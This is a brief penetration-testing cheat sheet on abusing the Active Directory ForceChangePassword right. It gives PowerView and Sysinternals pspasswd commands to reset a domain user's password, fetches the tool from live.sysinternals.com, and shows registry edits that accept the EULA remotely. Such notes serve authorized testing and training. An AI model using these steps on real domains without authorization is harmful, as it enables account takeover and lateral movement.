# Living off the Land

## 01 - Enumerate

> [!IMPORTANT] Conditions
> Write the conditions...

```

```

## 02 - Exploit

### 2.1 - PowerShell

```
PS C:\> Import-Module .\PowerView.ps1

$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
Set-DomainUserPassword -Identity "<username>" -AccountPassword $password -Verbose
```

### 2.2 - Sysinternals

> [!IMPORTANT] Conditions
> To execute sysinternal tool. EULA must be accepted (`-accepteula`). Otherwise this can be done in registry hive.
> ```
> C:\> reg.exe add [\\<IP>\]HKCU\Software\Sysinternals /t REG_DWORD /v 'EulaAccepted' /d 0x00000001
> 
> PS C:\> Set-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Sysinternals' -Type DWord -Name 'EulaAccepted' -Value 0x00000001
> ```

#### 2.2.1 - Command Prompt

```
C:\> net.exe use z: \\live.sysinternals.com\tools

C:\> copy z:\pspasswd64.exe .

C:\> net.exe use z: /delete
```

#### 2.2.2 - PowerShell

```
PS C:\> New-PSDrive -Name Z -PSProvider FileSystem -Root "\\live.sysinternals.com\tools"

PS C:\> Copy-Item z:\pspasswd64.exe .

PS C:\> Remove-PSDrive -Name Z
```

Accept the EULA.

```
C:\> .\pspasswd64.exe -accepteula
```

Change password.

```
C:\> .\pspasswd64.exe -u <username> -p <password>
```

---
## References

### Hacking Articles

- [Hacking Articles: Abusing AD-DACL - ForceChangePassword](https://www.hackingarticles.in/abusing-ad-dacl-forcechangepassword/)

- [Hacking Articles: Remote Windows PC Enumeration using PSTools](https://www.hackingarticles.in/remote-windows-pc-enumeration-using-pstools/)